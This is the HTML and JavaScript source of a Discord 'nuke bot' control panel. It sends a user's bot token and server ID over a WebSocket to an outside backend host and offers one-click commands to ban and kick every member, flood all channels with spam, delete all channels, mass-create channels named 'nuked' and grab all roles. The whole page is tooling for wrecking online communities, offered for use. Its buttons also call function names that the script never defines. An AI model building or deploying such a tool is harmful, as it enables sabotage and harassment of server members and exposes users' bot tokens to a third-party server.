<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KENZO x RYUGA - Nuke Bot Control Panel</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Monospace', monospace; background: #050508; color: #fff; min-height: 100vh; }
    .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
    .header { text-align: center; padding: 30px 0; border-bottom: 1px solid #1a1a2e; margin-bottom: 30px; }
    .logo { font-size: 32px; font-weight: 800; color: #00ff88; letter-spacing: 2px; }
    .subtitle { color: #888; margin-top: 8px; font-size: 14px; }
    
    .page { display: none; }
    .page.active { display: block; animation: fadeIn 0.3s ease; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    
    .card { background: #0d0d14; border: 1px solid #1a1a2e; border-radius: 16px; padding: 24px; margin-bottom: 20px; }
    .card-title { color: #00ff88; font-size: 12px; font-weight: 700; letter-spacing: 1px; margin-bottom: 20px; text-transform: uppercase; }
    
    .input-group { margin-bottom: 16px; }
    .input-label { display: block; font-size: 10px; font-weight: 600; color: #888; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
    .input { width: 100%; background: #050508; border: 1px solid #1a1a2e; border-radius: 10px; padding: 14px; font-size: 14px; color: #fff; font-family: monospace; }
    .input:focus { outline: none; border-color: #00ff88; }
    
    .btn { padding: 16px 32px; border-radius: 12px; font-size: 14px; font-weight: 700; font-family: monospace; cursor: pointer; transition: all 0.2s; border: none; }
    .btn-primary { background: #00ff88; color: #000; }
    .btn-primary:hover { background: #00e67a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,255,136,0.3); }
    .btn-danger { background: #ff3333; color: #fff; }
    .btn-danger:hover { background: #ff1a1a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(255,51,51,0.3); }
    .btn-secondary { background: #1a1a2e; color: #ffaa00; border: 1px solid #333; }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
    
    .btn-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-top: 16px; }
    .cmd-btn { padding: 20px; border-radius: 12px; background: #0a0a0f; border: 1px solid #1a1a2e; text-align: center; cursor: pointer; transition: all 0.2s; }
    .cmd-btn:hover { border-color: #00ff88; background: #101018; transform: translateY(-2px); }
    .cmd-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
    .cmd-icon { font-size: 28px; margin-bottom: 8px; display: block; }
    .cmd-name { font-size: 14px; font-weight: 700; color: #fff; font-family: monospace; margin-bottom: 4px; }
    .cmd-desc { font-size: 11px; color: #888; font-family: monospace; }
    
    .status-bar { display: flex; align-items: center; gap: 12px; padding: 16px; background: #0d0d14; border-radius: 12px; border: 1px solid #1a1a2e; margin-bottom: 24px; }
    .status-dot { width: 12px; height: 12px; border-radius: 50%; background: #666; }
    .status-dot.online { background: #00ff88; animation: pulse 1.5s infinite; }
    .status-dot.connecting { background: #ffaa00; animation: spin 1s linear infinite; }
    .status-dot.error { background: #ff3333; }
    @keyframes pulse { 0%,100% { opacity: 0.6; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    .status-text { font-family: monospace; font-weight: 600; }
    
    .log-container { background: #0a0a0f; border: 1px solid #1a1a2e; border-radius: 12px; height: 300px; overflow-y: auto; padding: 16px; font-family: monospace; font-size: 12px; line-height: 1.6; }
    .log-line { color: #ccc; margin-bottom: 4px; }
    .log-line.success { color: #00ff88; }
    .log-line.error { color: #ff3333; }
    .log-line.warning { color: #ffaa00; }
    .log-line.info { color: #00ff88; }
    
    .tabs { display: flex; gap: 8px; margin-bottom: 24px; }
    .tab { padding: 12px 24px; background: #0d0d14; border: 1px solid #1a1a2e; border-radius: 8px; color: #888; cursor: pointer; font-family: monospace; font-weight: 600; transition: all 0.2s; }
    .tab.active { background: #00ff88; color: #000; border-color: #00ff88; }
    .tab:hover:not(.active) { border-color: #00ff88; color: #00ff88; }
    
    .hidden { display: none !important; }
    .row { display: flex; gap: 16px; }
    .row > * { flex: 1; }
    
    @media (max-width: 768px) {
      .container { padding: 16px; }
      .btn-grid { grid-template-columns: 1fr; }
      .row { flex-direction: column; gap: 16px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">KENZO x RYUGA</div>
      <div class="subtitle">Nuke Bot Control Panel</div>
    </div>

    <div class="status-bar">
      <div class="status-dot" id="statusDot"></div>
      <div class="status-text" id="statusText">Disconnected</div>
      <span style="margin-left: auto; color: #666; font-size: 12px;" id="backendStatus">Backend: Unknown</span>
    </div>

    <div class="tabs">
      <button class="tab active" onclick="showPage('config')">Configuration</button>
      <button class="tab" onclick="showPage('dashboard')">Dashboard</button>
    </div>

    <!-- CONFIG PAGE -->
    <div class="page active" id="page-config">
      <div class="card">
        <div class="card-title">Bot Configuration</div>
        <div class="row">
          <div class="input-group">
            <label class="input-label">Bot Token</label>
            <input type="password" class="input" id="botToken" placeholder="MTxxxxxxxxxxxxxxxxxxxx.xxxx.xxxxxxxxxxxxxxxxxxxxxxxx">
          </div>
          <div class="input-group">
            <label class="input-label">Server ID</label>
            <input type="text" class="input" id="serverId" placeholder="123456789012345678" inputmode="numeric">
          </div>
        </div>
        <div class="input-group">
          <label class="input-label">Custom Name</label>
          <input type="text" class="input" id="customName" placeholder="KENZO x RYUGA" value="KENZO x RYUGA">
        </div>
        <div style="display: flex; gap: 12px; margin-top: 24px;">
          <button class="btn btn-primary" onclick="connectBot()" style="flex: 1;">▶ CONNECT</button>
          <button class="btn btn-danger" onclick="disconnectBot()" style="flex: 1;" id="disconnectBtn" disabled>■ DISCONNECT</button>
        </div>
      </div>

      <div class="card">
        <div class="card-title">Quick Commands (Requires Connection)</div>
        <div class="btn-grid" id="quickCommands" style="opacity: 0.5; pointer-events: none;">
          <button class="cmd-btn" onclick="sendCommand('BAN_ALL')" id="cmdBanAll">
            <span class="cmd-icon">🔨</span>
            <span class="cmd-name">BAN ALL</span>
            <span class="cmd-desc">Ban every member</span>
          </button>
          <button class="cmd-btn" onclick="sendCommand('KICK_ALL')" id="cmdKickAll">
            <span class="cmd-icon">👢</span>
            <span class="cmd-name">KICK ALL</span>
            <span class="cmd-desc">Kick every member</span>
          </button>
          <button class="cmd-btn" onclick="sendCommand('SPAM_ALL')" id="cmdSpamAll">
            <span class="cmd-icon">💬</span>
            <span class="cmd-name">SPAM ALL</span>
            <span class="cmd-desc">Flood all channels</span>
          </button>
          <button class="cmd-btn" onclick="sendCommand('DELETE_ALL')" id="cmdDeleteAll">
            <span class="cmd-icon">🗑</span>
            <span class="cmd-name">DELETE CHANNELS</span>
            <span class="cmd-desc">Remove all channels</span>
          </button>
          <button class="cmd-btn" onclick="sendCommand('CREATE_CHANNELS')" id="cmdCreateChannels">
            <span class="cmd-icon">➕</span>
            <span class="cmd-name">CREATE CHANNELS</span>
            <span class="cmd-desc">Mass create channels</span>
          </button>
          <button class="cmd-btn" onclick="sendCommand('CLAIM_ROLES')" id="cmdClaimRoles">
            <span class="cmd-icon">⭐</span>
            <span class="cmd-name">CLAIM ROLES</span>
            <span class="cmd-desc">Grab all roles</span>
          </button>
        </div>
      </div>
    </div>

    <!-- DASHBOARD PAGE -->
    <div class="page" id="page-dashboard">
      <div class="card">
        <div class="card-title">Live Activity Log</div>
        <div class="log-container" id="logContainer"></div>
      </div>
    </div>
  </div>

  <script>
    // Configuration
    const BACKEND_URL = 'wss://nuke-bot-on85.onrender.com';
    
    // State
    let ws = null;
    let isConnected = false;
    let botToken = '';
    let serverId = '';
    let customName = '';
    
    // DOM Elements
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');
    const backendStatus = document.getElementById('backendStatus');
    const logContainer = document.getElementById('logContainer');
    const quickCommands = document.getElementById('quickCommands');
    const disconnectBtn = document.getElementById('disconnectBtn');
    
    // Utility
    function log(message, type = 'info') {
      const timestamp = new Date().toLocaleTimeString();
      const line = document.createElement('div');
      line.className = 'log-line ' + type;
      line.textContent = '[' + timestamp + '] ' + message;
      logContainer.appendChild(line);
      logContainer.scrollTop = logContainer.scrollHeight;
    }
    
    function setStatus(status) {
      isConnected = (status === 'online');
      statusDot.className = 'status-dot ' + status;
      statusText.textContent = status.charAt(0).toUpperCase() + status.slice(1);
      document.getElementById('disconnectBtn').disabled = !isConnected;
      document.getElementById('quickCommands').style.opacity = isConnected ? '1' : '0.5';
      document.getElementById('quickCommands').style.pointerEvents = isConnected ? 'auto' : 'none';
    }
    
    function setBackendStatus(text) {
      document.getElementById('backendStatus').textContent = 'Backend: ' + text;
    }
    
    // WebSocket Connection
    function connect() {
      botToken = document.getElementById('botToken').value.trim();
      serverId = document.getElementById('serverId').value.trim();
      customName = document.getElementById('customName').value.trim();
      
      if (!botToken) {
        alert('Please enter bot token');
        return;
      }
      
      log('Connecting to backend...', 'info');
      document.getElementById('backendStatus').textContent = 'Backend: Connecting...';
      setStatus('connecting');
      
      ws = new WebSocket('wss://nuke-bot-on85.onrender.com');
      
      ws.onopen = () => {
        log('✅ Connected to backend', 'success');
        document.getElementById('backendStatus').textContent = 'Backend: Connected';
        ws.send(JSON.stringify({
          type: 'CONNECT',
          token: botToken,
          customName: customName || 'KENZO x RYUGA',
        }));
      };
      
      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          
          if (msg.type === 'LOG') {
            log(msg.message, msg.message.includes('✅') || msg.message.includes('✓') ? 'success' : 
                msg.message.includes('❌') || msg.message.includes('✗') ? 'error' : 'info');
          } else if (msg.type === 'READY') {
            log('🎉 Bot is ONLINE and ready!', 'success');
            setStatus('online');
            document.getElementById('backendStatus').textContent = 'Backend: Bot Online';
          } else if (msg.type === 'ERROR') {
            log('❌ ' + msg.message, 'error');
            setStatus('error');
            document.getElementById('backendStatus').textContent = 'Backend: Error';
          } else if (msg.type === 'CLOSE') {
            log('Connection closed: ' + (msg.reason || msg.code), 'warning');
            document.getElementById('backendStatus').textContent = 'Backend: Disconnected';
            if (isConnected) setStatus('offline');
          }
        } catch (e) {
          console.error('Message parse error:', e);
        }
      };
      
      ws.onerror = (err) => {
        log('❌ Connection error: ' + err.message, 'error');
        setStatus('error');
        document.getElementById('backendStatus').textContent = 'Backend: Error';
      };
      
      ws.onclose = () => {
        log('Connection closed', 'warning');
        document.getElementById('backendStatus').textContent = 'Backend: Disconnected';
        if (isConnected) setStatus('offline');
      };
    }
    
    function disconnect() {
      if (ws) {
        ws.close();
        ws = null;
      }
      setStatus('offline');
      document.getElementById('backendStatus').textContent = 'Backend: Disconnected';
      log('Disconnected', 'warning');
    }
    
    function sendCommand(command) {
      if (!ws || ws.readyState !== WebSocket.OPEN) {
        log('Not connected', 'error');
        return;
      }
      
      const payload = {
        type: 'COMMAND',
        command,
        guildId: serverId
      };
      
      // Add command-specific payload
      if (command === 'SPAM_ALL') {
        payload.message = 'SPAM';
        payload.perChannel = 1;
      } else if (command === 'CREATE_CHANNELS') {
        payload.count = 50;
        payload.name = 'nuked';
        payload.type = 0;
      } else if (command === 'BAN_ALL' || command === 'KICK_ALL' || command === 'DELETE_ALL') {
        if (!serverId) {
          log('Please enter Server ID in config', 'error');
          return;
        }
      }
      
      ws.send(JSON.stringify(payload));
      log('📤 Sent command: ' + command, 'info');
    }
    
    // Page Navigation
    function showPage(page) {
      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.getElementById('page-' + page).classList.add('active');
      event.target.classList.add('active');
    }
    
    // Load saved config
    window.addEventListener('load', () => {
      const savedToken = localStorage.getItem('botToken');
      const savedServerId = localStorage.getItem('serverId');
      const savedName = localStorage.getItem('customName');
      
      if (savedToken) document.getElementById('botToken').value = savedToken;
      if (savedServerId) document.getElementById('serverId').value = savedServerId;
      if (savedName) document.getElementById('customName').value = savedName;
      
      // Auto-connect if token exists
      if (savedToken) {
        log('Auto-connecting with saved token...', 'info');
        setTimeout(connect, 1000);
      }
    });
    
    // Save config on input
    ['botToken', 'serverId', 'customName'].forEach(id => {
      document.getElementById(id).addEventListener('input', (e) => {
        localStorage.setItem(id, e.target.value);
      });
    });
  </script>
</body>
</html>
